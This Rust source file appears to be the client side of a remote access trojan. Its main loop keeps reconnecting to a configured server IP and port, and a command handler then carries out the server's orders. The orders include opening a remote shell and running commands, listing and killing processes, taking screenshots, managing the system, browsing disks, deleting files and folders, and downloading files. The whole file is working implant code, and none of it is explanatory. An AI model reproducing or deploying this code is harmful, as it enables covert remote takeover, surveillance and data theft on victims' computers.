

use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Child;
use std::sync::{Arc, Mutex};
use std::thread::sleep;

pub mod features;
pub mod handler;
pub mod service;
pub mod settings;

use handler::handle_command;
use common::buffers::read_buffer;
use rand::{rngs::OsRng, Rng};
use std::process;

use common::commands::Command;


fn handle_server(mut read_stream: TcpStream, mut write_stream: TcpStream, is_connected: Arc<Mutex<bool>>) {
    let mut remote_shell: Option<Child> = None;

    let mut current_path = PathBuf::new();

    let mut secret = [0u8; common::SECRET_LEN];
    OsRng.fill(&mut secret);

    

    loop {
        let received_command = read_buffer(&mut read_stream);
        match received_command {
            Ok(command) => {
                let mut handler_name: &str = "";
                let mut command_data_storage = String::new();
                let mut command_data: &str = "";

                let mut path_storage = String::new();
                let mut path = "";
                match command {
                    Command::InitClient => handler_name = "INIT_CLIENT",
                    Command::Reconnect => {
                        *is_connected.lock().unwrap() = false;
                        break;
                    },
                    Command::Disconnect => {
                        if let Some(shell) = remote_shell.as_mut() {
                            let _ = shell.kill();
                        }
                        process::exit(1);
                    },
                    Command::GetProcessList => handler_name = "PROCESS_LIST",
                    Command::KillProcess(data) => {
                        handler_name = "KILL_PROCESS";
                        command_data_storage = data.pid.to_string();
                        command_data = &command_data_storage;
                    },
                    Command::StartShell => handler_name = "START_SHELL",
                    Command::ExitShell => handler_name = "EXIT_SHELL",
                    Command::ShellCommand(data) => {
                        handler_name = "SHELL_COMMAND";
                        command_data_storage = data;
                        command_data = &command_data_storage;
                    },
                    Command::ScreenshotDisplay(data) => {
                        handler_name = "SCREENSHOT";
                        command_data_storage = data.to_string();
                        command_data = &command_data_storage;
                    },
                    Command::ManageSystem(data) => {
                        handler_name = "MANAGE_SYSTEM";
                        command_data_storage = data.to_string();
                        command_data = &command_data_storage;
                    }
                    Command::AvailableDisks => {
                        handler_name = "FILE_MANAGER";
                        command_data = "AVAILABLE_DISKS";
                    },
                    Command::PreviousDir => {
                        handler_name = "FILE_MANAGER";
                        command_data = "PREVIOUS_DIR";
                    },
                    Command::ViewDir(data) => {
                        handler_name = "FILE_MANAGER";
                        command_data = "VIEW_DIR";
                        path_storage = data;
                        path = &path_storage;
                    },
                    Command::RemoveDir(data) => {
                        handler_name = "FILE_MANAGER";
                        command_data = "REMOVE_DIR";
                        path_storage = data;
                        path = &path_storage;
                    },
                    Command::RemoveFile(data) => {
                        handler_name = "FILE_MANAGER";
                        command_data = "REMOVE_FILE";
                        path_storage = data;
                        path = &path_storage;
                    },
                    Command::DownloadFile(data) => {
                        handler_name = "FILE_MANAGER";
                        command_data = "DOWNLOAD_FILE";
                        path_storage = data;
                        path = &path_storage;
                    },
                    _ => {  
                        println!("Received an unknown or unhandled command.");
                    }
                }
                if handler_name.is_empty() {
                    println!("Received an unknown or unhandled command.");
                } else {
                    handle_command(&mut write_stream, handler_name, command_data, path, &mut remote_shell, &mut current_path);
                }
            }
            Err(_) => {
                println!("Disconnected!");
                if let Some(shell) = remote_shell.as_mut() {
                    let _ = shell.kill();
                }
                *is_connected.lock().unwrap() = false;
                break;  
            }
        }
    }
}


fn main() {
    service::mutex::mutex_lock();
    let is_connected = Arc::new(Mutex::new(false));

    loop {
        let is_connected_clone = is_connected.clone();
        if *is_connected_clone.lock().unwrap() {
            sleep(std::time::Duration::from_secs(5));
            continue;
        }

        std::thread::spawn(move || {
            println!("Connecting to server...");
            let stream = TcpStream::connect(format!("{}:{}", settings::IP, settings::PORT));
            if let Ok(str) = stream {
                *is_connected_clone.lock().unwrap() = true;
                handle_server(str.try_clone().unwrap(), str.try_clone().unwrap(), is_connected_clone);
            };
        });
        sleep(std::time::Duration::from_secs(5));
    }
}